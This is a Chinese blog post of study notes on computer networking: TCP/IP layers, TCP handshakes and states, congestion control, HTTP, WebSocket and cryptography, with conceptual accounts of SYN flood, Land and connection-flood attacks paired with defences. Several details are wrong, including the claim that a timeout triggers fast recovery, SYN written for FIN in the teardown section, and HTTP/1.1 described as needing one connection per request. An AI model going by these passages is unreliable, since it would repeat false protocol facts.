---
title: 计算机网络
date: 2023-05-07 21:37:05
tags:
---

# TCP/IP五层网络模型

1. **应用层**：负责处理应用程序的特定通信细节。常见的应用层协议有HTTP（用于Web浏览器和服务器之间的通信）、SMTP（用于发送和接收电子邮件）和FTP（用于文件传输）等。
2. **传输层**：负责在网络中传输数据。主要有两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。TCP提供可靠的、面向连接的数据传输，确保数据完整性和顺序；UDP提供不可靠的、无连接的数据传输，速度快但可能丢失数据。
3. **网络层**：负责将数据包在网络中进行路由和寻址。互联网协议（IP）是网络层的核心协议，负责将数据包传输到目标设备。此外，还有一些辅助协议，如ICMP（用于诊断网络问题）和IGMP（用于多播通信）等。
4. **数据链路层**：负责在同一网络中传输数据帧。数据链路层协议负责将网络层的IP数据包封装为数据帧，并通过物理介质进行传输。常见的数据链路层协议有以太网、Wi-Fi和PPP等。
5. **物理层**：负责在物理介质上进行数据传输。物理层定义了网络设备之间的电气、机械和时序规范，以及数据在物理介质上的编码方式。常见的物理介质有双绞线、光纤和无线电波等。

# TCP

TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的传输协议。

## 报文格式

TCP报文（也称为TCP段或TCP数据包）是TCP协议中用于在网络中传输数据的基本单位。TCP报文包含了一个TCP首部和可选的数据部分。

TCP报文的首部格式如下：

1. **源端口（Source Port，16位）**：表示报文发送方的端口号。
2. **目的端口（Destination Port，16位）**：表示报文接收方的端口号。
3. **序列号（Sequence Number，32位）**：表示报文中数据的第一个字节的序列号。是TCP报文中每个字节的唯一编号。当发送方发送一个TCP报文时，它会为报文中的第一个字节分配一个序列号。序列号的主要作用是帮助接收方对乱序、重复或丢失的报文进行排序和处理，从而确保数据的顺序和完整性。
4. **确认号（Acknowledgment Number，32位）**：表示期望收到对方下一个报文的序列号，只有当ACK标志位被设置时才有效。
5. **数据偏移（Data Offset，4位）**：表示TCP首部的长度，以32位字（4字节）为单位。
6. **保留（Reserved，6位）**：保留位，未使用，设置为0。
7. **控制位（Control Bits，6位）**：包含了一系列控制标志，如URG（紧急指针有效）、ACK（确认号有效）、PSH（推送）、RST（复位连接）、SYN（同步序列号）、FIN（结束连接）等。
8. **窗口大小（Window Size，16位）**：表示发送方当前可接收的数据量（以字节为单位）。
9. **校验和（Checksum，16位）**：用于检测报文在传输过程中是否发生错误。
10. **紧急指针（Urgent Pointer，16位）**：仅在URG标志位被设置时有效，表示紧急数据在报文中的偏移量。
11. **选项（Options，可选，长度可变）**：包含了一些可选的TCP功能，如最大报文长度（MSS）、窗口扩大因子（Window Scale）和选择性确认（SACK）等。
12. **填充（Padding，可选，长度可变）**：用于保证TCP首部的长度为32位字的整数倍。

TCP报文首部后面的数据部分包含了实际要传输的数据。TCP通过将数据划分为多个报文并为每个报文分配一个唯一的序列号，实现了可靠的、面向连接的数据传输。

## TCP连接的状态

TCP连接的建立、数据传输和断开过程涉及多种状态。以下是TCP连接状态的详细说明：

1. **CLOSED**：初始状态，表示没有建立连接，也没有活动的连接。
2. **LISTEN**：服务器处于侦听状态，等待客户端发送连接请求。这是服务器主动打开的初始状态。
3. **SYN_SENT**：客户端发送SYN报文后，进入SYN_SENT状态。这表示客户端已发送连接请求，等待服务器的回应。
4. **SYN_RECEIVED**：服务器收到客户端的SYN报文后，发送自己的SYN报文和确认ACK报文，进入SYN_RECEIVED状态。这表示服务器已确认客户端的连接请求，等待客户端确认。
5. **ESTABLISHED**：双方都收到并确认对方的SYN报文后，连接建立成功，进入ESTABLISHED状态。此时，双方可以开始数据传输。
6. **FIN_WAIT_1**：当客户端完成数据传输并发送FIN报文后，进入FIN_WAIT_1状态。这表示客户端请求关闭连接，等待服务器的确认。
7. **FIN_WAIT_2**：客户端收到服务器对FIN报文的确认ACK报文后，进入FIN_WAIT_2状态。此时，客户端等待服务器发送自己的FIN报文，表示服务器已完成数据传输。
8. **CLOSE_WAIT**：服务器收到客户端的FIN报文后，进入CLOSE_WAIT状态。这表示服务器已确认客户端的关闭请求，但仍需等待服务器完成数据传输。
9. **CLOSING**：当双方同时发送FIN报文时，客户端会在收到服务器的FIN报文前进入CLOSING状态。这表示双方都请求关闭连接，但客户端尚未收到服务器对其FIN报文的确认。
10. **LAST_ACK**：服务器在发送FIN报文后，进入LAST_ACK状态。这表示服务器等待客户端对其FIN报文的确认。
11. **TIME_WAIT**：客户端收到服务器的FIN报文并确认后，进入TIME_WAIT状态。客户端会在这个状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保服务器收到对其FIN报文的确认。之后，客户端进入CLOSED状态，关闭连接。
12. **CLOSED**：连接已完全关闭，可以释放所有相关资源。

这些状态描述了TCP连接的整个生命周期，包括连接建立、数据传输和连接关闭

## 三次握手

### 三次握手的过程

TCP三次握手（Three-Way Handshake）是建立TCP连接的过程，通过三次交换控制报文来确认双方的收发能力和同步双方的初始序列号。以下是TCP三次握手的详细步骤：

1. **SYN**：客户端发送一个TCP报文，其中SYN（Synchronize Sequence Numbers，同步序列号）标志位被设置为1，表示这是一个连接请求。客户端还会选择一个初始序列号x，并将其放入报文的序列号字段。

2. **SYN-ACK**：服务器收到客户端的SYN报文后，会发送一个响应报文。在这个报文中，SYN标志位和ACK（Acknowledge，确认）标志位都被设置为1。服务器也会选择一个初始序列号y，并将其放入报文的序列号字段。同时，服务器会将客户端报文序列号x加1，并将结果放入报文的确认号字段，表示期望收到客户端下一个报文的序列号。

3. **ACK**：客户端收到服务器的SYN-ACK报文后，会发送一个ACK报文。在这个报文中，ACK标志位被设置为1。客户端会将服务器报文的序列号y加1，并将结果放入报文的确认号字段，表示期望收到服务器下一个报文的序列号。至此，TCP三次握手完成，双方建立起了连接。

在TCP三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号。

总之，TCP三次握手是建立TCP连接的过程，包括以下三个步骤：

1. 客户端发送SYN报文，请求连接，并设置初始序列号x。
2. 服务器回复SYN-ACK报文，确认连接请求，设置初始序列号y，确认号为x+1。
3. 客户端发送ACK报文，确认服务器的SYN-ACK，确认号为y+1。

握手完成后，TCP连接建立，数据传输开始。

### 三次而不是两次握手的原因

TCP三次握手的主要目的是在不可靠的网络环境中实现可靠的连接建立。三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。这里详细说明为什么需要三次握手：

1. **确认收发能力**：通过三次握手，客户端和服务器可以确认对方的收发能力。首先，客户端发送SYN报文表示其具备发送能力；其次，服务器回复SYN-ACK报文表示其具备接收和发送能力；最后，客户端发送ACK报文表示其具备接收能力。这个过程确保了双方在连接建立后都能正常地收发数据。

2. **同步初始序列号**：在TCP协议中，每个字节都有唯一的序列号。为了实现可靠的数据传输，客户端和服务器需要在建立连接时同步各自的初始序列号。在三次握手过程中，客户端和服务器分别为自己的报文选择初始序列号，并在握手过程中交换这些序列号。这样，双方都能知道对方期望收到的第一个字节的序列号，从而为后续的数据传输做好准备。

如果只进行两次握手，客户端和服务器之间的连接可能不可靠。例如，客户端发送SYN报文后，服务器回复SYN-ACK报文，但无法确认客户端是否具备接收能力。这可能导致服务器发送的数据无法被客户端正确接收，从而影响通信质量。因此，为了实现可靠的连接建立，TCP协议采用了三次握手的机制。

### SYN攻击

SYN攻击（也称为TCP SYN泛洪攻击）是一种利用TCP协议三次握手机制进行的拒绝服务（DoS）攻击。攻击者向目标服务器发送大量伪造源IP地址的SYN报文，目的是消耗服务器的资源，使正常用户无法访问该服务器。以下是SYN攻击的详细过程：

1. 攻击者向目标服务器发送大量SYN报文，这些报文的源IP地址是伪造的。每个SYN报文都表示一个连接请求。
2. 目标服务器收到SYN报文后，会为每个报文分配一个半连接（half-open connection），并回复SYN-ACK报文。由于源IP地址是伪造的，这些SYN-ACK报文无法到达真正的发送方。
3. 目标服务器等待攻击者发送ACK报文以完成握手过程。然而，由于源IP地址是伪造的，ACK报文永远不会到达。目标服务器会在一定时间内保留这些半连接，直到超时。
4. 攻击者持续发送大量伪造的SYN报文，导致目标服务器的资源耗尽，从而无法处理正常用户的连接请求。

SYN攻击的危害在于它可以通过较少的资源（例如，较低的带宽和较少的报文）消耗大量服务器资源，从而实现拒绝服务的目的。防御SYN攻击的方法包括：

1. **缩短超时时间**：减少服务器等待ACK报文的时间，以便更快地释放半连接资源。
2. **增加半连接队列大小**：增加服务器可以处理的半连接数量，以应对大量的SYN报文。
3. **SYN cookies**：服务器在回复SYN-ACK报文时，使用一种称为SYN cookies的技术生成确认号，而不是分配半连接。当收到有效的ACK报文时，服务器可以通过确认号重新构建连接状态，从而避免为伪造的SYN报文分配资源。
4. **过滤伪造的IP地址**：部署网络设备（例如防火墙和入侵检测系统）来识别并阻止伪造的IP地址，以减少SYN攻击的影响。

尽管SYN攻击是一种比较古老的攻击方式，但它仍然具有一定的威胁。通过采用合适的防御措施，可以降低SYN攻击对服务器的影响。

### Land攻击

Land攻击是一种DoS（拒绝服务）攻击类型，这种攻击利用TCP/IP协议的漏洞，通过发送伪造的数据包来使目标系统无法正常工作。Land攻击的特点是发送的数据包的源IP地址和目标IP地址相同，同时源端口和目标端口也相同。

Land攻击的过程如下：

1. 攻击者构造一个伪造的TCP数据包，将源IP地址和目标IP地址设置为目标系统的IP地址，同时将源端口和目标端口设置为相同的端口号。
2. 攻击者发送这个伪造的数据包到目标系统。
3. 目标系统在收到这个数据包后，由于源IP地址和目标IP地址相同，尝试与自身建立连接。这会导致目标系统的资源消耗，进而可能导致系统崩溃或无法响应其他合法请求。

Land攻击在20世纪90年代是一种较为常见的攻击手段，但现在大部分操作系统和网络设备已经修复了相关漏洞，不再受此类攻击影响。然而，为了防止潜在的Land攻击，可以采取以下措施：

1. 更新操作系统和网络设备的软件，确保已修复相关漏洞。
2. 配置防火墙和入侵检测系统（IDS）来识别并过滤伪造的数据包。
3. 监控网络流量，以检测异常数据包和潜在的攻击行为。

### Connection Flood攻击

Connection Flood攻击是一种拒绝服务（DoS）攻击类型，其主要目标是消耗目标服务器的连接资源，使其无法处理新的合法连接请求。这种攻击方法通常通过发送大量的连接请求或半打开的连接来实现。

在Connection Flood攻击中，攻击者通常采取以下步骤：

1. 攻击者向目标服务器发送大量的连接请求，可能使用合法或伪造的IP地址。
2. 目标服务器在收到连接请求后，尝试为每个请求分配资源，以处理并维护这些连接。
3. 随着连接数量的增加，目标服务器的资源逐渐耗尽，导致无法处理新的合法连接请求。

Connection Flood攻击可能针对不同的协议和服务，例如HTTP连接泛洪、TCP连接泛洪或TLS/SSL连接泛洪。

为了防御Connection Flood攻击，可以采取以下措施：

1. **限制连接速率**：为单个IP地址或子网设置连接速率限制，以防止攻击者短时间内发送大量连接请求。
2. **连接队列管理**：优化连接队列策略，例如缩短超时时间、增加队列大小等，以提高服务器处理连接请求的能力。
3. **入侵检测和防御系统**：部署入侵检测和防御系统（IDPS），以实时监测并阻止Connection Flood攻击。
4. **负载均衡**：通过负载均衡技术将连接请求分发到多个服务器，以减轻单个服务器的压力，并提高整体服务的抗攻击能力。
5. **IP地址过滤**：使用防火墙或其他安全设备过滤来自可疑或恶意IP地址的连接请求。
6. **应用层防御**：针对特定服务或协议的攻击，例如HTTP或TLS/SSL连接泛洪，可以使用Web应用防火墙（WAF）或其他应用层防御技术进行防护。

## 四次挥手

### 四次挥手的过程

TCP四次挥手是TCP连接在传输完成后进行断开的过程。TCP（传输控制协议）是一种面向连接的协议，因此在数据传输完成后，需要通过一个四步过程来正常关闭连接。以下是TCP四次挥手的详细步骤：

1. **第一次挥手**：客户端向服务器发送一个FIN报文，表示客户端已经完成数据传输，请求关闭连接。此时，客户端进入FIN_WAIT_1状态。

2. **第二次挥手**：服务器收到客户端发送的FIN报文后，会发送一个ACK报文确认客户端的FIN报文已收到。此时，服务器进入CLOSE_WAIT状态，而客户端收到ACK报文后进入FIN_WAIT_2状态。

3. **第三次挥手**：当服务器完成数据传输后，也会向客户端发送一个FIN报文，表示服务器同意关闭连接。此时，服务器进入LAST_ACK状态。

4. **第四次挥手**：客户端在收到服务器的 FIN 报文后，发送 ACK 报文确认并进入 TIME_WAIT 状态。服务器收到 ACK 报文后，立即关闭连接。2 倍 MSL（约 2 分钟）后，客户端关闭连接。

### 要有TIME_WAIT状态的原因

 TIME_WAIT状态存在于TCP连接关闭过程中，具有几个重要的原因：

1. **确保最后一个ACK报文被对方接收**：在TCP四次挥手过程中，客户端发送最后一个ACK报文确认收到服务器的FIN报文。TIME_WAIT状态确保了这个ACK报文能够被服务器正确接收。如果服务器没有收到这个确认报文，它会重发FIN报文。此时，由于客户端仍处于TIME_WAIT状态，可以再次发送ACK报文进行确认。

2. **处理延迟的数据包**：在TIME_WAIT状态期间，客户端可以处理可能延迟到达的数据包。这有助于确保连接关闭前的所有数据包都被正确处理，防止数据丢失或错误。

3. **防止旧连接数据包干扰新连接**：TCP连接由源IP、目标IP、源端口和目标端口四元组唯一确定。在某些情况下，相同的四元组可能在短时间内被重新用于新的连接。TIME_WAIT状态可以防止旧连接中仍在网络中传输的数据包干扰新连接。客户端在TIME_WAIT状态持续一段时间（通常为2倍的最大分段生存时间，MSL），以确保旧连接的数据包从网络中消失。

总之，TIME_WAIT状态在TCP连接关闭过程中发挥了重要作用，它确保了最后一个ACK报文被接收、处理延迟数据包和防止旧连接数据包干扰新连接。这有助于维护TCP连接的可靠性和数据传输的完整性。

### 关闭连接的需要四次挥手，而建立连接只要三次握手的原因

三次握手的过程可以确保双方都具备收发数据的能力，并能同步双方的初始序列号。确认过程中间有一个合并的SYN和ACK，所以是三步。

关闭连接需要四次挥手，因为 TCP 是全双工的，双方需要独立地确认对方已经完成数据发送，服务端收到SYN时可能还不能关闭连接，不能合并ACK和FIN，所以是四步。

## 流量控制

### 滑动窗口机制

TCP协议使用以字节为单位的滑动窗口协议来控制字节流的发送

 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口前部的字节已经发送并且收到了确认，那么就将发送窗口向后滑动一定距离，直到第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口前部字节为已经接收到的字节，收到数据并发送确认后，就向后滑动接收窗口，直到接收窗口为0。  

### 确认重传机制

在TCP中，选择性重传的实现原理主要依赖于选择性确认（Selective Acknowledgment, SACK）机制。SACK是一种TCP扩展，其目的是改进TCP在数据包丢失的情况下的性能。它允许接收方在确认报文中指定已成功接收的不连续数据段，从而使发送方可以更精确地了解哪些报文段需要重传。

SACK是通过在TCP报文头部添加选项字段来实现的。以下是SACK实现的主要步骤：

1. 协商SACK：在TCP连接建立过程中，双方通过在SYN和SYN-ACK报文中包含SACK-permitted选项来表示支持SACK。
2. 接收数据并生成SACK块：接收方在接收数据时，记录每个已成功接收的数据段的左边界和右边界，并按照顺序排列。接收方在发送确认报文（ACK）时，会在TCP头部选项字段中加入SACK选项。SACK选项包含一个或多个SACK块，每个SACK块表示一个已成功接收的不连续数据段范围（左边界和右边界）。
3. 处理SACK报文并重传数据：发送方在收到包含SACK选项的确认报文后，会根据其中的信息判断哪些报文段需要重传。发送方只需要重传那些未被确认的报文段，而已成功接收的数据段不会被重传。

## 拥塞控制

### 原理

TCP维护了一个拥塞窗口（cwnd，congestion window），窗口大小是发送端可以往网络发送的不会产生网络阻塞的字节数

### 拥塞控制方法

#### **慢启动算法**

慢启动用于在TCP连接开始时cwnd从初始值1逐渐（指数级）增加数据发送速率和传输窗口大小。发送端为连接维护了一个慢启动阈值（ssthread，slow start thread），一旦慢启动超过了慢启动阈值，TCP就从慢启动切换到拥塞避免算法（线性增加）

- 当cwnd < ssthread，使用慢启动算法
- 当cwnd > ssthread，使用拥塞避免算法
- 当cwnd = ssthread，既可以使用慢启动算法，也可以使用拥塞避免算法

#### 拥塞避免算法

拥塞避免算法的思路是让cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1

#### **快速恢复算法**

如果发送方接收到3个或3个以上的重复确认时，就认为网络出现了拥塞，此时将启用快速恢复算法

当发生超时，不是进行慢启动，而是进行快速恢复，先将ssthread设为cwnd/2，再将cwnd设为ssthread，然后执行拥塞避免算法

#### **快速重传算法**

如果发送方接收到3个或3个以上的重复确认（duplicate ACK）时，就认为前面发送的数据包已经丢失，立即重传这些数据包而不是等待超时重传，但是在重传之前会先执行快速恢复算法，以减轻网络拥塞

## 粘包、拆包

TCP粘包和拆包是指在TCP传输过程中，发送方发送的多个小数据包被接收方合并成一个大数据包（粘包），或者一个大数据包被接收方拆分成多个小数据包（拆包）的现象。

造成TCP粘包和拆包的主要原因是TCP协议是面向流的，发送方和接收方之间没有明显的分界点，数据以字节流的形式进行传输。这就导致了发送方发送的多个小数据包可能会在接收方端被合并成一个大数据包，或者一个大数据包在传输过程中被拆分成多个小数据包。

为了避免TCP粘包和拆包现象，通常需要进行数据分包和数据拆包处理。数据分包是将待发送的数据按照固定大小的数据块进行分割，以便接收方能够正确接收数据。数据拆包则是将接收到的大数据包拆分成多个小数据包，以便上层应用程序能够正确处理数据。

常用的TCP粘包和拆包处理方式包括：

1. 固定长度分包：将数据按照固定长度进行分包，接收方按照相同的长度进行接收和处理。

2. 在数据包头部增加数据长度信息：将数据长度信息添加到数据包头部，接收方根据长度信息进行接收和处理。

3. 使用分隔符分包：将不同数据块之间加上特定的分隔符进行分包。

4. 消息头+消息体：在消息头中增加消息体长度字段，接收方先接收消息头中的消息体长度字段，然后根据长度信息接收和处理数据

通过这些处理方式，可以有效避免TCP粘包和拆包现象，保证数据传输的正确性和完整性。

# UDP

UDP（User Datagram Protocol）是一种无连接、不可靠的传输层协议，它以尽可能少的开销提供了一种面向事务的简单传输服务。相比于TCP协议，UDP协议不具备可靠性和流量控制机制，但是它具有传输速度快、数据包大小灵活等优势，在实时应用场景中得到广泛应用。

UDP协议的主要特点如下：

1. 无连接：UDP协议不需要进行连接建立和释放操作，直接向目标主机发送数据包即可，因此传输效率较高。
2. 面向报文：UDP协议对应用层传递的报文既不合并也不拆分，以数据包为单位进行传输。
3. 无流量控制：UDP协议不具备流量控制机制，发送方按照自己的速度发送数据包，而不考虑接收方的接收能力。
4. 无拥塞控制：发送方可以按照自己的速度发送数据包，不会对网络拥塞状况进行检测。
5. 无重传机制：在UDP协议中，如果某个数据包在传输过程中丢失或损坏，UDP协议不会进行重传，也不会通知发送方，是不可靠的。

UDP协议在实时应用场景中得到广泛应用，如视频、语音、游戏等实时性要求较高的应用。由于UDP协议具有传输速度快、数据包大小灵活等优势，能够满足实时应用的要求，并且由于无连接、无可靠性等特点，使得实现简单，成本低廉。但是，也由于UDP协议不具备可靠性和流量控制机制，因此在需要数据传输的可靠性和稳定性的应用场景中，如文件传输、邮件等，通常使用TCP协议来保证传输的可靠性。

# HTTP

## 特点

HTTP是明文传输的、无状态的（关闭后客户端和服务端都不会保留任何上一次连接的信息）

## 短连接

短连接的特点：

- 是HTTP/1.0的默认方式，每次请求都需要重新建立连接，可能导致较高的开销。
- 由于连接频繁建立和关闭，服务器可能需要处理大量的连接请求。

短连接的适用场景：

- 不需要长时间维持连接的场景。
- 低频率请求

## 长连接

长连接的特点：

- 是HTTP/1.1的默认方式，允许客户端在一个连接上发送多个请求，而不必每次都重新建立连接。
- 减少了重新建立连接的开销
- 长连接可能会占用服务器资源，因为连接在使用完后不会立即关闭。

长连接的适用场景：

- 需要长时间维持连接的场景，如实时应用和高频通信。
- 高频率请求

## 多路复用

在HTTP/1.1中，每个请求和响应都需要单独的TCP连接。虽然HTTP/1.1引入了长连接来减少连接开销，但在每个连接上仍然只能同时处理一个请求。这可能导致队头阻塞问题，即较慢的请求阻塞后续请求的处理。HTTP/2通过多路复用解决了这个问题。

多路复用的特点：

- 允许在单个TCP连接上同时发送和接收多个请求和响应

## 状态码

HTTP 状态码（HTTP Status Codes）是服务器用于表示客户端请求结果的三位数字。状态码分为五类，各类状态码的含义如下：

1xx（信息响应）：请求已接收，继续处理。

2xx（成功）：请求已成功接收、理解和接受。

3xx（重定向）：需要后续操作才能完成请求。

4xx（客户端错误）：请求包含错误语法或无法完成。

5xx（服务器错误）：服务器在处理请求时发生错误。

| 状态码 | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| 100    | Continue: 请求已接收，继续处理。                             |
| 200    | OK: 请求成功，服务器已经处理了请求并返回了所需数据。         |
| 201    | Created: 请求成功并已创建了新资源。                          |
| 202    | Accepted: 请求已被接受，但尚未处理。                         |
| 204    | No Content: 请求成功，但无需返回任何内容。                   |
| 300    | Multiple Choices: 请求的资源有多个表示。                     |
| 301    | Moved Permanently: 请求的资源已被永久移动到新的 URL。        |
| 302    | Found: 请求的资源临时移动到新的 URL。                        |
| 303    | See Other: 对于 POST 请求，资源的响应可以在另一个 URL 上找到。 |
| 304    | Not Modified: 资源自上次请求以来未发生更改。                 |
| 307    | Temporary Redirect: 请求的资源临时移动到新的 URL。           |
| 308    | Permanent Redirect: 请求的资源已被永久移动到新的 URL。       |
| 400    | Bad Request: 请求格式错误或服务器无法理解请求。              |
| 401    | Unauthorized: 请求需要认证。客户端应提供认证信息。           |
| 403    | Forbidden: 客户端没有权限访问所请求的资源。                  |
| 404    | Not Found: 服务器找不到请求的资源。                          |
| 405    | Method Not Allowed: 请求方法（GET、POST 等）对于所请求的资源不允许。 |
| 500    | Internal Server Error: 服务器在处理请求时遇到内部错误。      |
| 501    | Not Implemented: 服务器不支持请求所需要的功能。              |
| 502    | Bad Gateway: 作为网关或代理角色的服务器从上游服务器接收到无效响应。 |
| 503    | Service Unavailable: 服务器暂时无法处理请求（由于过载或维护）。 |
| 504    | Gateway Timeout: 作为网关或代理角色的服务器未及时从上游服务器收到请求。 |

# WebSockets

WebSocket是一种通信协议，它在单个TCP连接上提供了全双工通信，允许客户端和服务器同时发送和接收消息。。WebSocket协议旨在解决HTTP协议在实时通信场景中的局限性，如低延迟和服务器主动推送消息等。

WebSocket协议的主要特点如下：

1. 全双工通信：WebSocket允许客户端和服务器在同一时间通过一个连接进行双向通信，而不是像HTTP那样的请求-响应模式。这使得数据传输更加高效，延迟更低。

2. 低延迟：由于WebSocket建立在一个持久的TCP连接上，并减少了传输数据所需的开销，因此在实时应用中具有更低的延迟。

3. 服务器推送：WebSocket允许服务器主动向客户端推送消息，而无需客户端明确请求。这对于实时通知、聊天应用、在线游戏等场景非常有用。

4. 兼容性：WebSocket协议在设计时考虑了与HTTP协议的兼容性，使用HTTP升级请求将普通的HTTP连接升级为WebSocket连接。这意味着WebSocket可以利用现有的HTTP基础设施，如代理服务器和负载均衡器。

WebSocket的一些常见应用场景包括：

- 实时消息传递和聊天应用
- 在线游戏
- 实时数据推送和更新，如股票行情、体育比分等
- 即时协作工具，如在线文档编辑、共享白板等
- 物联网（IoT）设备间的通信

# 密码学

## 哈希算法

哈希算法（Hash algorithm）是密码学领域中的一种重要技术，它将任意长度的输入数据（通常称为消息）映射到固定长度的输出（通常称为哈希值、摘要或指纹）。哈希算法具有许多实际应用，如数据完整性验证、消息认证、数字签名以及密码存储等。

一个优秀的哈希算法应具有以下特性：

1. 确定性：对于相同的输入，哈希算法总是产生相同的输出。
2. 高效性：哈希算法应能快速地计算出输入数据的哈希值。
3. 单向性（预映像抗性）：给定一个哈希值，计算出原始输入数据应是非常困难的。
4. 二次预映像抗性：给定一个输入数据，找到另一个不同的输入，使其具有相同的哈希值，应该是非常困难的。
5. 抗碰撞性：找到任意两个不同的输入，它们具有相同的哈希值，应该是非常困难的。
6. 随机性：哈希值的输出应该看起来是随机的，即使对于相似的输入，它们的哈希值也应该有很大差异。

在密码学中，常用的哈希算法有：

1. MD5（Message Digest Algorithm 5）：MD5是一种广泛使用的哈希算法，产生128位（16字节）的哈希值。然而，由于已知的安全漏洞，如碰撞攻击，MD5不再被认为是安全的哈希算法。
2. SHA-1（Secure Hash Algorithm 1）：SHA-1是一种哈希算法，产生160位（20字节）的哈希值。与MD5类似，由于已知的安全漏洞，如碰撞攻击，SHA-1也不再被认为是安全的哈希算法。
3. SHA-2（Secure Hash Algorithm 2）：SHA-2是一种哈希算法族，包括SHA-256、SHA-512等，分别产生不同长度的哈希值（256bit、512bit等），比SHA-1和MD5更安全，是目前安全的、推荐使用的Hash算法。
4. SHA-3（Secure Hash Algorithm 3）：SHA-3是一种新的哈希算法族，包括SHA3-256、SHA3-512等。是安全的。

## 碰撞攻击

碰撞攻击（Collision attack）是一种针对哈希算法的攻击方法，其目标是找到两个不同的输入数据，它们具有相同的哈希值。理论上，一个理想的哈希函数应具有较高的抗碰撞性，即使计算能力非常强大，也应该很难找到具有相同哈希值的两个不同输入。

然而，在实际中，许多哈希算法（如MD5和SHA-1）已经被证明存在碰撞攻击的漏洞。这些漏洞使攻击者能够在相对较短的时间内找到具有相同哈希值的不同输入，从而破坏哈希算法的安全性。

碰撞攻击的成功可能导致以下安全问题：

1. 伪造数字签名：如果攻击者能够找到两个具有相同哈希值的不同文档，他们可以使一个文档的有效数字签名适用于另一个文档，从而实现伪造。
2. 证书颁发伪造：攻击者可以利用碰撞攻击创建具有相同哈希值的伪造证书，从而破坏SSL/TLS等安全通信协议的信任基础。
3. 数据完整性损害：哈希函数通常用于检查数据的完整性，如下载文件的校验。如果攻击者能够创建具有相同哈希值的恶意文件，用户可能会在不知情的情况下下载和使用这些文件。

为了防范碰撞攻击，密码学家和研究人员持续开发新的、更安全的哈希算法。例如，SHA-2和SHA-3系列哈希算法被认为比MD5和SHA-1更抗碰撞攻击。通过使用更安全的哈希算法，可以提高数据完整性、消息认证和数字签名等应用的安全性。

## 对称加密算法

对称加密算法是密码学中的一种加密方法，它使用相同的密钥（称为秘密密钥）对数据进行加密和解密。由于加密和解密过程共享相同的密钥，这种算法被称为对称加密。对称加密算法通常比非对称加密算法更快，因为它们在计算上相对简单。然而，密钥管理和安全密钥分发可能是对称加密算法面临的挑战。

以下是一些著名的对称加密算法：

1. DES（Data Encryption Standard）：DES是一种曾广泛使用的对称加密算法，它使用56位密钥对数据进行加密。安全性低（曾被破解），不建议使用DES进行加密。
2. 3DES（Triple DES ）：3DES是DES的改进版本，通过对数据应用三次DES加密操作来增加安全性。尽管3DES比DES更安全，但它的加密速度较慢，并且已经有更安全、更高效的替代方案。
3.  AES（Advanced Encryption Standard）：AES是现代对称加密算法的事实标准，支持128、192和256位密钥长度，安全性高且加密速度快。AES被广泛应用于各种安全场景，如文件加密、安全通信和网络安全等。
5. Twofish：Twofish是Blowfish算法的继任者，也是AES算法竞争过程中的一个候选算法。Twofish使用128位的块大小和可变长度的密钥（128、192或256位）。尽管它在安全性和效率方面表现良好，但它没有像AES那样被广泛采用。

对称加密算法在许多密码学应用中都有广泛应用，如保护数据的机密性、安全通信和身份认证等。然而，它们的一个主要局限性是密钥管理和分发。在许多场景中，对称加密算法与非对称加密算法结合使用。在这种混合方法中，非对称加密算法用于安全地交换对称密钥，而对称加密算法则用于实际的数据加密和解密。这种组合利用了非对称加密算法在密钥管理和分发方面安全性高的优势，同时保留了对称加密算法在数据加密和解密方面的高效性。

## 非对称密钥算法

非对称密钥算法，又称公钥加密算法，是一种加密和解密过程中使用不同密钥的加密方法。在非对称加密算法中，通常有一对密钥，一个是公钥，另一个是私钥。公钥用于加密数据，而私钥用于解密数据。以下是实际中常用的非对称密钥算法：

1. RSA（Rivest-Shamir-Adleman）算法：RSA 是一种广泛应用的非对称加密算法，由 Ron Rivest、Adi Shamir 和 Leonard Adleman 于 1978 年发明。RSA 算法基于大数因子分解问题，它的安全性依赖于大数分解的困难性。RSA 用于加密、解密和数字签名，应用领域包括网页浏览器、电子邮件、VPN 等。

2. ElGamal 算法：ElGamal 算法由 Taher ElGamal 于 1985 年提出，基于有限域上的离散对数问题。ElGamal 算法主要应用于加密和数字签名，安全性取决于离散对数问题的难度。

3. ECC（Elliptic Curve Cryptography）：椭圆曲线密码学是一种基于椭圆曲线数学理论的非对称加密算法。ECC 相较于 RSA 和 ElGamal 算法具有更高的安全性和更短的密钥长度，因此在资源受限的环境（如物联网设备、智能卡等）中具有优势。ECC 可应用于加密、解密、数字签名和密钥协商等多个场景。

4. DSA（Digital Signature Algorithm）：DSA 是一种专门用于数字签名的非对称加密算法，由美国国家安全局（NSA）和美国国家标准与技术研究院（NIST）在 1991 年共同开发。DSA 是基于离散对数问题的，与 ElGamal 算法有相似之处。DSA 的安全性取决于离散对数问题的难度。

5. Lattice-based cryptography（格基密码学）：格基密码学是一种基于格数学的非对称加密算法，它具有抵抗量子计算机攻击的潜力。NTRU 和 Learning With Errors（LWE）是目前最知名的格基密码学算法。随着量子计算机的发展，格基密码学可能在未来成为一种重要的密码学工具。

## 数字签名

数字签名是一种用于验证数据的完整性和来源的真实性的密码学技术。数字签名的基本原理是将数据（如文件、消息或电子文档）通过某种算法处理，生成一个唯一的签名。这个签名可以证明数据的完整性和发送方的身份。数字签名在许多场景中非常有用，如电子邮件、软件分发、电子合同、在线支付等。数字签名的实现通常依赖于非对称加密技术。

以下是数字签名的基本过程：

1. 数据散列（Hashing）：首先，将要签名的数据通过哈希算法即散列函数（如 SHA-256）处理，生成一个固定长度的散列值。

2. 签名生成：使用发送方的私钥对散列值进行加密，生成数字签名。这一过程确保了只有发送方才能生成有效的签名，因为私钥是唯一的且不能被推导出来。

3. 附加签名：将数字签名附加到原始数据上，然后将数据和签名一起发送给接收方。

4. 签名验证：接收方首先使用相同的散列函数对收到的数据进行散列处理，得到一个散列值。然后，使用发送方的公钥对附加的数字签名进行解密，得到另一个散列值。接收方比较这两个散列值，如果它们完全相同，则说明数据未被篡改，且发送方的身份得到验证。

数字签名的安全性取决于所使用的哈希算法（散列函数）和非对称加密算法的安全性。

## 数字证书

